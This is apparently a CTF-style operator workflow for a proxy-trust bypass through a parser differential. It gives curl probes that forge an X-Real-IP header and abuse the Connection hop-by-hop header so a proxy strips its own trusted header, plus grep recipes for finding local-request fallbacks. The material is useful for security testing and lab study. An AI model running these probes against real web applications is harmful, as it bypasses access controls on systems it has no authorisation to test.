# Workflow deep — the parser-differential attack, step by step

The operator's sequence for a proxy-trust bypass, with the failure at each step.

---

## Phase 0 — classify — is this a parser-differential

```bash
python3 tools/classify.py --source <dir>
python3 tools/chain_match.py --source <dir> --record <challenge>
```

```text
the signals: a proxy in the path, a proxy-header the app trusts, a
missing-header fallback, a normalization boundary.
a chain card match → run the card's first_confirming_probe first.
```

## Phase 1 — detect the proxy — a front-end in the path

```bash
# the proxy's headers — a proxy in the path
curl -sI "$BASE/" | grep -iE 'x-forwarded|x-real|via:|x-served|server|x-backend|x-upstream|cf-|x-varnish'
#   a Via / an X-Forwarded-* / a Server header → a proxy in the path
```

## Phase 2 — map the trust check — the proxy-header input

```bash
# the app's proxy-header input — a header the app reads
grep -rnoiE 'X-Real-IP|X-Forwarded|X-Internal|X-Admin|X-Original|X-Rewrite|client_ip|remote_addr|request.headers|request\.META|request\.env|header' <src> | head -20
```

## Phase 3 — the trust-check's fallback — the missing-header case

```bash
# the missing-header fallback — the app's local-request check
grep -rnoiE '127.0.0.1|localhost|local|internal|trust|fallback|missing|getattr|header\.get|request.headers.get|remote_addr|is_local' <src> | head -15
```

## Phase 4 — the client-supplied probe — a forged proxy header

```bash
# does the app trust a client-supplied proxy header
curl "$BASE/api/restricted" -H 'X-Real-IP: 127.0.0.1'   # a client-supplied X-Real-IP
#   a 200 → the app trusts the client-supplied header → the check's input
```

## Phase 5 — the hop-by-hop probe — the Connection-strip

```bash
# the two-request check — does the proxy strip its own header
curl "$BASE/api/restricted"   # the normal request
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Real-IP'   # the proxy strips X-Real-IP
#   the second request reaches the app without X-Real-IP → a 200 vs a 401
```

## Phase 6 — the differential — the front-end/back-end mismatch

```text
the differential: the proxy strips its own header → the app sees a
request without the trusted header → a missing-header fallback → a
local request → the trust check bypassed.
```

## Phase 7 — the reach — which routes are reachable

```text
the bypass reaches a route the proxy's header gates — an
authenticated-only route, an internal route, a restricted endpoint —
the app's trust check reads the missing or client-supplied header's
effect.
```

## Phase 8 — the chain — the differential + the downstream

```text
the verified card's chain: a hop-by-hop bypass → a cache-overflow →
a DOM-clobber prototype-pollution → a polyglot exfil — a multi-step
chain through the differential.
```

## Phase 9 — the falsifier — when to move

```text
the card's falsifier: 'both forms are rejected, so the trust check
does not depend on that header' — the header isn't the trust check's
input → a different class.
a proxy that strips a client-supplied header → the client-supplied
bypass fails → the hop-by-hop bypass is the remaining vector.
a proxy that doesn't strip its own header → the hop-by-hop bypass
fails → a different class.
```

## Phase 10 — the ledger — what to record

```bash
python3 tools/state.py <c> --hypothesis \
  "parser-diff-step-<n>: <surface> — header=<proxy-header> — fallback=<missing-header>"
```
